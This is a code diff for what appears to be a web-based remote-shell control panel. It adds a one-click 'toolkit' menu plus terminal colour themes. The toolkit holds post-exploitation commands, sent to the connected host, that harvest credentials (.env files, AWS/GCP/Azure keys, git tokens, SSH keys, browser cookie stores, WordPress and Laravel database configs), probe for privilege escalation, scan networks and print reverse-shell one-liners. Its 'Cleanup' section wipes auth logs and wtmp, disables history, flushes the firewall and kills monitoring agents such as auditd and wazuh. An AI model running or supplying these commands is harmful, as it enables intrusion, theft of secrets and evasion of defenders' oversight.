+  { name: 'Docker Secrets/Envs', cmd: 'for c in $(docker ps -q 2>/dev/null); do echo "=== CONTAINER: $c ==="; docker inspect $c 2>/dev/null | python3 -m json.tool 2>/dev/null | grep -iE "Env|Secret|Password|Key|Token" | head -20; done' },
+  { name: 'Docker via Socket', cmd: 'curl -sf --unix-socket /var/run/docker.sock http://localhost/containers/json 2>/dev/null | python3 -m json.tool 2>/dev/null | grep -E "Id|Image|Status|Names" | head -30 || echo "(no docker socket or no access)"' },
+  { cat: 'Privesc' },
+  { name: 'SUID Binaries', cmd: 'find / -perm -4000 -type f 2>/dev/null | head -25' },
+  { name: 'SGID Binaries', cmd: 'find / -perm -2000 -type f 2>/dev/null | head -25' },
+  { name: 'Writable Dirs', cmd: 'find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys | head -20' },
+  { name: 'Sudo Rights', cmd: 'sudo -l 2>/dev/null || echo "(sudo not available)"' },
+  { name: 'Capabilities', cmd: 'getcap -r / 2>/dev/null | head -20 || echo "(getcap not found)"' },
+  { name: 'World-Writable /etc', cmd: 'find /etc -writable -type f 2>/dev/null | head -20; echo "=== PASSWD WRITABLE ===" && [ -w /etc/passwd ] && echo "YES" || echo "no"' },
+  { name: 'Cron Job Hijack', cmd: 'echo "=== WRITABLE CRON SCRIPTS ===" && find /etc/cron* /var/spool/cron -writable 2>/dev/null | head -10; echo "=== CRON PATH DIRS ===" && cat /etc/crontab 2>/dev/null | grep PATH | tr ":" "\\n" | while read d; do [ -w "$d" ] && echo "WRITABLE: $d"; done' },
+  { name: 'NFS no_root_squash', cmd: 'cat /etc/exports 2>/dev/null | grep -v "^#"; showmount -e 127.0.0.1 2>/dev/null' },
+  { name: 'PATH Injection', cmd: 'echo "=== SUID w/ relative cmds ===" && find / -perm -4000 2>/dev/null | while read b; do strings "$b" 2>/dev/null | grep -E "^[a-z]+$" | grep -vE "^(lib|GLIBC)" | head -3 | while read c; do which "$c" >/dev/null 2>&1 || echo "$b calls: $c (not absolute!)"; done; done | head -20' },
+  { cat: 'Exfil' },
+  { name: 'Find Interesting Files', cmd: 'find / \\( -name "*.txt" -o -name "*.cfg" -o -name "*.conf" -o -name "*.ini" -o -name "*.json" -o -name "*.yaml" -o -name "*.yml" -o -name "*.bak" \\) -readable 2>/dev/null | grep -iE "pass|key|secret|token|cred|auth|db|database|config" | head -30' },
+  { name: 'Dump .env Files', cmd: 'find / -name ".env" -readable 2>/dev/null | while read f; do echo "=== $f ==="; cat "$f" 2>/dev/null; done | head -100' },
+  { name: 'Source Code Secrets', cmd: 'find / \\( -name "*.py" -o -name "*.js" -o -name "*.php" -o -name "*.rb" -o -name "*.go" \\) -readable 2>/dev/null | xargs grep -liE "password|api_key|secret_key|access_token|private_key|aws_secret" 2>/dev/null | head -20' },
+  { name: 'Private Keys', cmd: 'find / \\( -name "*.pem" -o -name "*.key" -o -name "*.p12" -o -name "id_rsa" -o -name "id_ed25519" -o -name "*.ppk" \\) -readable 2>/dev/null | head -20' },
+  { name: 'DB Files (SQLite)', cmd: 'find / \\( -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" -o -name "*.mdb" \\) -readable 2>/dev/null | head -20' },
+  { name: 'Git Config / Tokens', cmd: 'find / -name ".gitconfig" -readable 2>/dev/null | xargs cat 2>/dev/null; find / -name ".git-credentials" -readable 2>/dev/null | xargs cat 2>/dev/null; find / -path "*/.config/gh/hosts.yml" -readable 2>/dev/null | xargs cat 2>/dev/null' },
+  { name: 'Cloud Creds (all)', cmd: 'echo "=== AWS ===" && cat ~/.aws/credentials 2>/dev/null; echo "=== GCP ===" && cat ~/.config/gcloud/application_default_credentials.json 2>/dev/null | head -20; echo "=== Azure ===" && cat ~/.azure/accessTokens.json 2>/dev/null | head -20; echo "=== DO ===" && cat ~/.config/doctl/config.yaml 2>/dev/null | grep token' },
+  { name: 'Browser Sessions', cmd: 'find /home /root \\( -name "cookies.sqlite" -o -name "Cookies" -o -name "Login Data" -o -name "logins.json" -o -name "key4.db" \\) 2>/dev/null' },
+  { cat: 'Mining Recon' },
+  { name: 'Active Miners', cmd: 'ps aux 2>/dev/null | grep -iE "xmrig|minerd|cgminer|bfgminer|ethminer|nbminer|lolminer|t-rex|gminer|cpuminer|cryptonight|monero" | grep -v grep; ls /tmp/.* /var/tmp/.* 2>/dev/null | grep -iE "xmr|mine|crypt" | head -10' },
+  { name: 'Cron Miners', cmd: 'crontab -l 2>/dev/null | grep -iE "wget|curl|bash|sh -c|xmr|mine"; grep -r "wget\\|curl" /etc/cron* /var/spool/cron 2>/dev/null | grep -iE "base64|xmr|mine|\\.sh" | head -10' },
+  { name: 'Pool Connections', cmd: 'ss -tn state established 2>/dev/null | awk \'{print $5}\' | cut -d: -f1 | sort | uniq -c | sort -rn | head -20; ss -tp 2>/dev/null | grep -E "330[0-9]|444[0-9]|14444|3333|5555|7777" | head -15' },
+  { name: 'Installed Miners', cmd: 'which xmrig xmr-stak cpuminer bfgminer cgminer ethminer nbminer lolminer t-rex gminer 2>/dev/null; find /tmp /var/tmp /dev/shm -executable -type f 2>/dev/null | head -10' },
+  { name: 'Resource Spike', cmd: 'echo "=== Top CPU ===" && ps aux --sort=-%cpu 2>/dev/null | head -10; echo "=== Load Average ===" && uptime; echo "=== Memory ===" && free -h' },
+  { name: 'LD Preload', cmd: 'cat /etc/ld.so.preload 2>/dev/null && echo "PRELOAD SET" || echo "(no preload)"; echo "=== LD_PRELOAD ENV ===" && env | grep LD_' },
+  { cat: 'CMS / Web Panels' },
+  { name: 'WordPress Config', cmd: 'find / -name "wp-config.php" -readable 2>/dev/null | while read f; do echo "=== $f ==="; grep -E "DB_|table_prefix|secret_key|AUTH_KEY" "$f" 2>/dev/null; done | head -60' },
+  { name: 'Joomla Config', cmd: 'find / -name "configuration.php" -readable 2>/dev/null | while read f; do echo "=== $f ==="; grep -E "\\$db|\\$password|\\$user|\\$secret|\\$host" "$f" 2>/dev/null; done | head -60' },
+  { name: 'Drupal Config', cmd: 'find / \\( -name "settings.php" -o -name "settings.local.php" \\) -readable 2>/dev/null | while read f; do echo "=== $f ==="; grep -E "database|username|password|host|driver" "$f" 2>/dev/null; done | head -60' },
+  { name: 'Laravel .env', cmd: 'find / -name ".env" -readable 2>/dev/null | while read f; do echo "=== $f ==="; grep -iE "DB_|MAIL_|AWS_|APP_KEY|SECRET|TOKEN|PASSWORD" "$f" 2>/dev/null; done | head -80' },
+  { name: 'cPanel Users', cmd: 'ls /var/cpanel/users/ 2>/dev/null | head -30; cat /etc/trueuserdomains 2>/dev/null | head -20; ls /home/ 2>/dev/null' },
+  { name: 'Web Server Configs', cmd: 'find /etc/nginx /etc/apache2 /etc/httpd -name "*.conf" -readable 2>/dev/null | xargs grep -liE "password|secret|auth_basic|ssl_certificate_key" 2>/dev/null | head -10 | xargs cat 2>/dev/null | grep -iE "pass|secret|key" | head -30' },
+  { name: 'Database Dumps', cmd: 'find / -name "*.sql" -o -name "*.sql.gz" -o -name "*.dump" 2>/dev/null | head -20; find /var/www /home /srv -name "backup*" -type f 2>/dev/null | head -10' },
+  { cat: 'IoT / Embedded' },
+  { name: 'Firmware Info', cmd: 'cat /etc/openwrt_release 2>/dev/null || cat /etc/firmware_version 2>/dev/null; strings /dev/mtdblock0 2>/dev/null | head -20' },
+  { name: 'BusyBox Check', cmd: 'busybox 2>&1 | head -3; ls /bin/busybox /usr/bin/busybox 2>/dev/null' },
+  { name: 'GPIO / Serial', cmd: 'ls /dev/tty* /dev/gpio* 2>/dev/null | head -20' },
+  { name: 'Router Config', cmd: 'nvram show 2>/dev/null | grep -iE "pass|key|ssid|wan" | head -20; cat /etc/config/wireless 2>/dev/null | head -30' },
+  { name: 'MTD Partitions', cmd: 'cat /proc/mtd 2>/dev/null; ls -la /dev/mtd* 2>/dev/null | head -20' },
+  { cat: 'Network Attacks' },
+  { name: 'Ping Sweep', cmd: 'SUBNET=$(ip route 2>/dev/null | grep -v default | grep src | head -1 | awk "{print \\$1}"); echo "Sweeping $SUBNET"; for i in $(seq 1 254); do IP="${SUBNET%.*}.$i"; (ping -c1 -W1 $IP &>/dev/null && echo "ALIVE: $IP") & done; wait; echo "done"' },
+  { name: 'Port Scan (common)', cmd: 'TARGET=${1:-127.0.0.1}; echo "Scanning $TARGET"; for p in 21 22 23 25 53 80 110 443 445 3306 3389 5432 5900 6379 8080 8443 9200 27017; do (echo >/dev/tcp/$TARGET/$p 2>/dev/null && echo "OPEN: $p") & done; wait' },
+  { name: 'Established Conns', cmd: 'ss -tnp state established 2>/dev/null | head -40 || netstat -tnp 2>/dev/null | grep ESTABLISHED | head -40' },
+  { name: 'Firewall Rules', cmd: 'echo "=== IPTABLES ===" && iptables -L -n -v 2>/dev/null | head -40 || echo "(no iptables)"; echo "=== NFTABLES ===" && nft list ruleset 2>/dev/null | head -30 || echo "(no nft)"; echo "=== UFW ===" && ufw status verbose 2>/dev/null || echo "(no ufw)"' },
+  { name: 'WiFi Networks', cmd: 'iwlist scan 2>/dev/null | grep -E "ESSID|Signal|Channel" | head -30 || iw dev 2>/dev/null && iw dev wlan0 scan 2>/dev/null | grep -E "SSID|signal|freq" | head -30' },
+  { cat: 'Anti-Forensics' },
+  { name: 'Process Hiding', cmd: 'echo "=== DELETED BINARIES ===" && find /proc/*/exe -type l 2>/dev/null | xargs ls -la 2>/dev/null | grep deleted | head -10; echo "=== HIDDEN FILES ===" && find / -name ".*" -type f 2>/dev/null | grep -iE "xmr|mine|hack|shell|back|root" | head -10' },
+  { name: 'Rootkit Check', cmd: 'echo "=== LD PRELOAD ===" && cat /etc/ld.so.preload 2>/dev/null && echo "PRELOAD ACTIVE" || echo "(clean)"; echo "=== LKM ===" && lsmod 2>/dev/null | head -20' },
+  { name: 'Kernel Modules', cmd: 'lsmod 2>/dev/null | head -30; echo "=== RECENTLY LOADED ===" && dmesg 2>/dev/null | grep -iE "module|insmod|loaded" | tail -10' },
+  { cat: 'Util' },
+  { name: 'Arch + Libc', cmd: 'uname -m && file /bin/ls 2>/dev/null && ldd --version 2>&1 | head -1; cat /proc/version' },
+  { name: 'Available Tools', cmd: 'for t in wget curl python3 python perl ruby php gcc cc nmap socat nc ncat netcat openssl ssh scp rsync busybox docker kubectl gdb strace ltrace tcpdump; do which $t 2>/dev/null && echo "  ok $t"; done' },
+  { name: 'File Download (curl)', cmd: 'echo "curl -sfLO http://YOUR_SERVER/file"; echo "wget -q http://YOUR_SERVER/file"' },
+  { name: 'Reverse Shell Cmds', cmd: 'IP="YOUR_IP"; PORT="YOUR_PORT"; echo "=== BASH ===" && echo "bash -i >& /dev/tcp/$IP/$PORT 0>&1"; echo "=== PYTHON ===" && echo "python3 -c \\"import os,pty,socket;s=socket.socket();s.connect((\\x27$IP\\x27,$PORT));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\\x27/bin/sh\\x27)\\""; echo "=== NC ===" && echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"' },
+  { name: 'Disk / Inode Usage', cmd: 'df -h 2>/dev/null; echo "=== INODES ===" && df -i 2>/dev/null | grep -v "Filesystem" | awk \'$5+0 > 50{print}\'; echo "=== BIG FILES ===" && find / -type f -size +100M 2>/dev/null | head -15' },
+  { name: 'Last Logins', cmd: 'last -20 2>/dev/null || lastlog 2>/dev/null | grep -v "Never" | head -20; echo "=== FAILED ===" && lastb 2>/dev/null | head -10 || grep -i "failed" /var/log/auth.log 2>/dev/null | tail -10' },
+  { name: 'SELinux / AppArmor', cmd: 'echo "=== SELINUX ===" && getenforce 2>/dev/null || sestatus 2>/dev/null || echo "(no selinux)"; echo "=== APPARMOR ===" && aa-status 2>/dev/null || cat /sys/module/apparmor/parameters/enabled 2>/dev/null || echo "(no apparmor)"; echo "=== SECCOMP ===" && grep Seccomp /proc/self/status 2>/dev/null' },
+  { cat: 'Cleanup' },
+  { name: 'Clear Logs', cmd: 'echo > /var/log/auth.log 2>/dev/null; echo > /var/log/syslog 2>/dev/null; echo > /var/log/wtmp 2>/dev/null; echo > ~/.bash_history; history -c; echo "logs cleared"' },
+  { name: 'Kill Traces', cmd: 'unset HISTFILE && export HISTSIZE=0 && echo "history disabled for session"' },
+  { name: 'Wipe Temp', cmd: 'rm -rf /tmp/.* /tmp/* 2>/dev/null; rm -rf /var/tmp/.* 2>/dev/null; echo "tmp wiped"' },
+  { name: 'Zero Wtmp/Utmp', cmd: '> /var/log/wtmp 2>/dev/null; > /var/log/utmp 2>/dev/null; > /var/log/lastlog 2>/dev/null; echo "login logs zeroed"' },
+  { name: 'Flush Firewall', cmd: 'iptables -F && iptables -X && iptables -P INPUT ACCEPT && iptables -P FORWARD ACCEPT && iptables -P OUTPUT ACCEPT && echo "firewall flushed"' },
+  { name: 'Kill Monitors', cmd: "pkill -9 -f 'auditd|ossec|wazuh|falcon|sysdig' 2>/dev/null; echo 'done'" },
 ];
 
-function toggleShellShortcuts() {
-  var existing = document.getElementById('shell-shortcuts-menu');
-  if (existing) { existing.remove(); return; }
-
-  var menu = document.createElement('div');
-  menu.id = 'shell-shortcuts-menu';
-  menu.className = 'shell-shortcuts-menu';
-
-  postExShortcuts.forEach(function (cat) {
-    var hdr = document.createElement('div');
-    hdr.className = 'ssm-cat';
-    hdr.textContent = cat.cat;
-    menu.appendChild(hdr);
-    cat.items.forEach(function (item) {
-      var row = document.createElement('div');
-      row.className = 'ssm-item';
-      row.innerHTML = '<span class="ssm-name">' + escHtml(item.name) + '</span>' +
-        '<span class="ssm-desc">' + escHtml(item.desc) + '</span>';
-      row.onclick = function () {
-        if (!shellWS || shellWS.readyState !== 1) { showToast('Not connected', false); return; }
-        var p = document.getElementById('shell-prompt').textContent;
-        appendOutput(p + ' ' + item.cmd + '\n');
-        shellWS.send(JSON.stringify({ command: item.cmd }));
-        menu.remove();
-      };
-      menu.appendChild(row);
-    });
-  });
-
-  // Close on outside click
-  function closeMenu(e) {
-    if (!menu.contains(e.target) && !e.target.closest('.shell-action-btn-shortcuts')) {
-      menu.remove();
-      document.removeEventListener('click', closeMenu);
-    }
+function buildToolkitMenu() {
+  var body = document.getElementById('toolkit-grid-body');
+  if (!body) return;
+  var q = ((document.getElementById('toolkit-search') || {}).value || '').toLowerCase();
+  var sections = [], cur = null;
+  for (var i = 0; i < toolkitItems.length; i++) {
+    var t = toolkitItems[i];
+    if (t.cat) { cur = { cat: t.cat, items: [] }; sections.push(cur); }
+    else if (cur) cur.items.push({ idx: i, name: t.name, cmd: t.cmd });
   }
-  setTimeout(function () { document.addEventListener('click', closeMenu); }, 0);
+  var html = '';
+  sections.forEach(function (sec) {
+    var items = q
+      ? sec.items.filter(function (it) { return it.name.toLowerCase().indexOf(q) !== -1 || it.cmd.toLowerCase().indexOf(q) !== -1; })
+      : sec.items;
+    if (!items.length) return;
+    html += '<div class="toolkit-section">';
+    html += '<div class="toolkit-section-header">' + escHtml(sec.cat) + '</div>';
+    html += '<div class="toolkit-section-grid">';
+    items.forEach(function (it) {
+      var prev = it.cmd.length > 55 ? it.cmd.slice(0, 55) + '…' : it.cmd;
+      html += '<div class="toolkit-item" onclick="runToolkitItem(' + it.idx + ')" title="' + escHtml(it.cmd) + '">' +
+        '<div class="toolkit-item-name">' + escHtml(it.name) + '</div>' +
+        '<div class="toolkit-item-preview">' + escHtml(prev) + '</div></div>';
+    });
+    html += '</div></div>';
+  });
+  body.innerHTML = html || '<div style="padding:16px;text-align:center;color:var(--text-dim);font-size:12px">No matches</div>';
+}
 
-  document.querySelector('.shell-actions').appendChild(menu);
+function toggleToolkit() {
+  var menu = document.getElementById('shell-toolkit-menu');
+  if (menu.classList.contains('open')) {
+    menu.classList.remove('open');
+    document.removeEventListener('click', _closeToolkitOutside);
+  } else {
+    buildToolkitMenu();
+    menu.classList.add('open');
+    setTimeout(function () { document.addEventListener('click', _closeToolkitOutside); }, 0);
+  }
+}
+
+function _closeToolkitOutside(e) {
+  var wrap = document.getElementById('shell-toolkit-wrap');
+  if (wrap && !wrap.contains(e.target)) {
+    document.getElementById('shell-toolkit-menu').classList.remove('open');
+    document.removeEventListener('click', _closeToolkitOutside);
+  }
+}
+
+function runToolkitItem(idx) {
+  var t = toolkitItems[idx];
+  if (!t || !t.cmd) return;
+  document.getElementById('shell-toolkit-menu').classList.remove('open');
+  document.removeEventListener('click', _closeToolkitOutside);
+  shellSendCmd(t.cmd);
 }
 
 // ---------------------------------------------------------------------------
@@ -2218,8 +2562,13 @@ document.getElementById('shell-input').addEventListener('keydown', function (e) 
     }
 
     shellHistory.push(cmd);
+    shellCmdLog.push({ ts: Date.now(), cmd: cmd });
     shellHistIdx = shellHistory.length;
     this.value = '';
+  } else if ((e.key === '=' || e.key === '+') && e.ctrlKey) {
+    e.preventDefault(); shellZoom(+1);
+  } else if (e.key === '-' && e.ctrlKey) {
+    e.preventDefault(); shellZoom(-1);
   } else if (e.key === 'ArrowUp') {
     if (tcMatches.length) { e.preventDefault(); navigateTabComplete(-1); return; }
     e.preventDefault();
@@ -3221,6 +3570,12 @@ function applyGlobalTheme(name) {
   r.style.setProperty('--header-bg', t.headerBg);
   document.body.style.background = t.bgBase;
   localStorage.setItem('vision_global_theme', name);
+  // Sync terminal theme when global theme matches a shell theme
+  if (typeof SHELL_THEMES !== 'undefined' && SHELL_THEMES[name]) {
+    applyShellTheme(name);
+    var sp = document.getElementById('shell-theme-picker');
+    if (sp) sp.value = name;
+  }
 }
 
 (function() {
@@ -3239,6 +3594,64 @@ function applyGlobalTheme(name) {
     // No global theme saved — sync picker to the current light/dark data-theme.
     var current = document.documentElement.getAttribute('data-theme') || 'dark';
     if (GLOBAL_THEMES[current]) picker.value = current;
+  }
+})();
+
+// ===========================================================================
+// TERMINAL THEMES
+// ===========================================================================
+var SHELL_THEMES = {
+  default:   { name: 'Default',    bg: '#0d1117', fg: '#c9d1d9', black: '#0d1117', red: '#ff7b72', green: '#3fb950', yellow: '#d29922', blue: '#58a6ff', magenta: '#bc8cff', cyan: '#39d353', white: '#c9d1d9', brightBlack: '#484f58', brightRed: '#ffa198', brightGreen: '#56d364', brightYellow: '#e3b341', brightBlue: '#79c0ff', brightMagenta: '#d2a8ff', brightCyan: '#56d364', brightWhite: '#f0f6fc' },
+  monokai:   { name: 'Monokai',    bg: '#272822', fg: '#f8f8f2', black: '#272822', red: '#f92672', green: '#a6e22e', yellow: '#f4bf75', blue: '#66d9ef', magenta: '#ae81ff', cyan: '#a1efe4', white: '#f8f8f2', brightBlack: '#75715e', brightRed: '#f92672', brightGreen: '#a6e22e', brightYellow: '#f4bf75', brightBlue: '#66d9ef', brightMagenta: '#ae81ff', brightCyan: '#a1efe4', brightWhite: '#f9f8f5' },
+  dracula:   { name: 'Dracula',    bg: '#282a36', fg: '#f8f8f2', black: '#21222c', red: '#ff5555', green: '#50fa7b', yellow: '#f1fa8c', blue: '#bd93f9', magenta: '#ff79c6', cyan: '#8be9fd', white: '#f8f8f2', brightBlack: '#6272a4', brightRed: '#ff6e6e', brightGreen: '#69ff94', brightYellow: '#ffffa5', brightBlue: '#d6acff', brightMagenta: '#ff92df', brightCyan: '#a4ffff', brightWhite: '#ffffff' },
+  solarized: { name: 'Solarized',  bg: '#002b36', fg: '#839496', black: '#073642', red: '#dc322f', green: '#859900', yellow: '#b58900', blue: '#268bd2', magenta: '#d33682', cyan: '#2aa198', white: '#eee8d5', brightBlack: '#586e75', brightRed: '#cb4b16', brightGreen: '#586e75', brightYellow: '#657b83', brightBlue: '#839496', brightMagenta: '#6c71c4', brightCyan: '#93a1a1', brightWhite: '#fdf6e3' },
+  nord:      { name: 'Nord',       bg: '#2e3440', fg: '#d8dee9', black: '#3b4252', red: '#bf616a', green: '#a3be8c', yellow: '#ebcb8b', blue: '#81a1c1', magenta: '#b48ead', cyan: '#88c0d0', white: '#e5e9f0', brightBlack: '#4c566a', brightRed: '#bf616a', brightGreen: '#a3be8c', brightYellow: '#ebcb8b', brightBlue: '#81a1c1', brightMagenta: '#b48ead', brightCyan: '#8fbcbb', brightWhite: '#eceff4' },
+  matrix:    { name: 'Matrix',     bg: '#0a0a0a', fg: '#00ff41', black: '#0a0a0a', red: '#00ff41', green: '#00ff41', yellow: '#33ff66', blue: '#00cc33', magenta: '#00ff41', cyan: '#33ff66', white: '#00ff41', brightBlack: '#003300', brightRed: '#33ff66', brightGreen: '#33ff66', brightYellow: '#66ff99', brightBlue: '#33ff66', brightMagenta: '#33ff66', brightCyan: '#66ff99', brightWhite: '#ccffcc' },
+  light:     { name: 'Light',      bg: '#ffffff', fg: '#1f1f1f', black: '#000000', red: '#d93025', green: '#0d904f', yellow: '#e37400', blue: '#1a73e8', magenta: '#7c3aed', cyan: '#007b83', white: '#ffffff', brightBlack: '#5f6368', brightRed: '#ea4335', brightGreen: '#34a853', brightYellow: '#fbbc04', brightBlue: '#4285f4', brightMagenta: '#9334e6', brightCyan: '#24c1e0', brightWhite: '#ffffff' }
+};
+
+function applyShellTheme(name) {
+  var theme = SHELL_THEMES[name];
+  if (!theme) return;
+  document.querySelectorAll('.shell-output').forEach(function (el) {
+    el.style.setProperty('--term-bg', theme.bg);
+    el.style.setProperty('--term-fg', theme.fg);
+    el.style.setProperty('--ansi-0',  theme.black);
+    el.style.setProperty('--ansi-1',  theme.red);
+    el.style.setProperty('--ansi-2',  theme.green);
+    el.style.setProperty('--ansi-3',  theme.yellow);
+    el.style.setProperty('--ansi-4',  theme.blue);
+    el.style.setProperty('--ansi-5',  theme.magenta);
+    el.style.setProperty('--ansi-6',  theme.cyan);
+    el.style.setProperty('--ansi-7',  theme.white);
+    el.style.setProperty('--ansi-8',  theme.brightBlack);
+    el.style.setProperty('--ansi-9',  theme.brightRed);
+    el.style.setProperty('--ansi-10', theme.brightGreen);
+    el.style.setProperty('--ansi-11', theme.brightYellow);
+    el.style.setProperty('--ansi-12', theme.brightBlue);
+    el.style.setProperty('--ansi-13', theme.brightMagenta);
+    el.style.setProperty('--ansi-14', theme.brightCyan);
+    el.style.setProperty('--ansi-15', theme.brightWhite);
+    el.style.background = theme.bg;
+    el.style.color = theme.fg;
+  });
+  localStorage.setItem('vision_shell_theme', name);
+}
+
+// Populate shell theme picker and restore saved
+(function () {
+  var picker = document.getElementById('shell-theme-picker');
+  if (!picker) return;
+  Object.keys(SHELL_THEMES).forEach(function (key) {
+    var opt = document.createElement('option');
+    opt.value = key;
+    opt.textContent = SHELL_THEMES[key].name;
+    picker.appendChild(opt);
+  });
+  var saved = localStorage.getItem('vision_shell_theme');
+  if (saved && SHELL_THEMES[saved]) {
+    picker.value = saved;
+    applyShellTheme(saved);
   }
 })();
 
